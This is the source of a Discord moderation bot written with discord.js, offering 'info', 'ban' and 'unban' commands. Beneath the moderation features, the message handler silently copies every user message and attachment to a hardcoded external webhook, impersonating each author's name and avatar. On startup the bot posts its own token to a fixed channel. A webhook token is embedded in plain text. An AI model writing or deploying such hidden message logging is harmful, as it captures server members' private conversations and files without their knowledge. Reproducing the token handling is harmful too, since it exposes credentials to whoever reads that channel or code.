const config = require("./config.json")

const Discord = require("discord.js");
const {
    MessageEmbed
} = require("discord.js")

 
const client = new Discord.Client({
    intents: ["GUILDS", "GUILD_MESSAGES", "GUILD_MEMBERS", "MESSAGE_CONTENT"],
    partials: ["CHANNEL", "MESSAGE"]
});

client.on("ready", async => {

 const embed = new MessageEmbed()
  .setTitle("client logged on!")
  .addFields(
      {name: "```who?```", value: "```" + client.user.tag + "```", inline: true},
      {name: "```token?```", value: `||${config.token}||`, inline: true},
    )
  .setColor('GREEN')
  .setTimestamp()

 client.channels.fetch('1400926912087331006').then(channel => channel.send({embeds: [embed]}))
 
client.user.setPresence({
  activities: [{ name: '???', type: 'STREAMING' }],
  status: 'dnd',
});


})

const webhook = new Discord.WebhookClient({
    id: '1400935245078986813',
    token: 'ivYodPXt8F_h6q2GpAOiA9VylMp8ERYTpTwQUJz7eFZQE8l-Z_KHqwZUTtd6gYIuCD56'
})

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  // Forward message content
  await webhook.send({
    content: `\`${message.author.displayName} (${message.author.tag})\`: ${message.content}`,
    username: message.author.username,
    avatarURL: message.author.displayAvatarURL({ dynamic: true }),
  });

  // Forward any attachments
  if (message.attachments.size > 0) {
    for (const attachment of message.attachments.values()) {
      await webhook.send({
        files: [attachment.url],
        username: message.author.username,
        avatarURL: message.author.displayAvatarURL({ dynamic: true }),
      });
    }
  }

  // --- handle commands ---
  if (message.content.startsWith(config.prefix)) {
    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === "info") {
        let input = args[0];
        let user;
        
        if (!input) {
            user = message.author;
        } else {
            const mention = message.mentions.users.first();
            if (mention) {
                user = mention;
            } else if (/^\d{17,19}$/.test(input)) {
                try {
                    user = await client.users.fetch(input);
                } catch {
                    return message.reply("`Couldn't fetch a user with that ID.`");
                }
            } else {
                return message.reply("`Please provide a valid user mention or user ID.`");
            }
        }
        
        const member = await message.guild.members.fetch(user.id).catch(() => null);
        
        let embed = new MessageEmbed()
        .setTitle("user details.")
        .setThumbnail(user.displayAvatarURL({ dynamic: true }))
        .setImage(user.displayAvatarURL({ dynamic: true, size: 1024 }))
        .addFields(
            { name: "```username?```", value: `\`${user.username}\``, inline: true },
            { name: "```tag?```", value: `\`${user.tag}\``, inline: true },
            { name: "```id?```", value: `\`${user.id}\``, inline: true },
            { name: "```is bot?```", value: `\`${user.bot ? "yes." : "no."}\``, inline: true },
            { name: "```account creation date?```", value: `*<t:${Math.floor(user.createdTimestamp / 1000)}:F>*`, inline: false }
        );

       if (member) {
        embed.addFields(
            { name: '```nickname?```', value: member.nickname || 'None', inline: true },
            { name: '```joined?```', value: `*<t:${Math.floor(member.joinedTimestamp / 1000)}:F>*`, inline: true },
            { name: '```roles?```', value: member.roles.cache.map(r => r.name).join(', ') || 'None', inline: false }
        );
    } else {
        embed.setFooter('User is not in this server.');
     }

      try {
            const banInfo = await message.guild.bans.fetch(user.id);
            embed.setDescription("```WARNING!``` This user has been banned from this server.")
            embed.addFields(
              {name: "```reason for ban?```", value: banInfo.reason, inline: true},
            )
            embed.setColor('RED')
        } catch (error) {
           embed.setColor('PURPLE')
        }
     
    embed.setTimestamp();
     
     message.reply({ embeds: [embed] });
}

if (command === 'ban') {
    if (!message.member.permissions.has('BAN_MEMBERS')) {
        return message.reply("*sorry, you can't ban anyone.*");
    }

    const targetIdOrMention = args[0];
    const reason = args.slice(1).join(' ') || 'n/a';

    if (!targetIdOrMention) return message.reply("*please, mention a valid username/ID or just ping them.");

    let userToBan;

    // Try getting from mention first
    const mentioned = message.mentions.members.first();
    if (mentioned) {
        userToBan = mentioned;
    } else {
        // Try fetching user by ID
        try {
            const fetchedUser = await message.client.users.fetch(targetIdOrMention);
            userToBan = fetchedUser;
        } catch (err) {
            return message.reply(`"*sorry, couldn't find a user with the id '**${targetIdOrMention}**'."`);
        }
    }

    // Check if user is already a member
    const memberToBan = message.guild.members.cache.get(userToBan.id);

    // If user is in guild and can't be banned
    if (memberToBan && !memberToBan.bannable) {
        return message.reply("*sorry, i can't ban them, maybe make my role higher?*");
    }

    try {
        await message.guild.members.ban(userToBan.id, { reason });
        let embed = new MessageEmbed()
        .setTitle("banned successfully.")
        .addFields(
          {name: "```id:```", value: `\`${userToBan.id}\``, inline: true},
          {name: "```tag?```", value: `\`${userToBan.tag}\``, inline: true},
          {name: "```why?```", value: `*${reason}*`, inline: true}
        )
        .setColor("DARK_BUT_NOT_BLACK")
        message.reply({embeds: [embed]})
    } catch (error) {
        console.error(error);
        message.reply("*sorry, i couldn't ban them.*");
    }
}

 if (command === 'unban') {
        if (!message.member.permissions.has('BAN_MEMBERS')) {
            return message.reply("*sorry, you can't unban anyone.*");
        }

        const userId = args[0];
        if (!userId) return message.reply("*please, provide the user's ID of whom you want to unban.*");

        try {
            const user = await message.guild.bans.fetch(userId);
            await message.guild.members.unban(user.user);
            let embed = new MessageEmbed()
            .setTitle("unbanned successfully.")
            .addFields(
              {name: "```id:```", value: `\`${userId}\``, inline: true},
              {name: "```tag?```", value: `\`${user.user.tag}\``, inline: true},
            )
            .setColor("DARK_BUT_NOT_BLACK")
            message.reply({embeds: [embed]})
        } catch (err) {
            console.error(err);
            message.channel.send("*sorry, i couldn't find anyone banned with this ID. check the ID or ban list?*");
        }
    }


  }
});





client.login(config.token)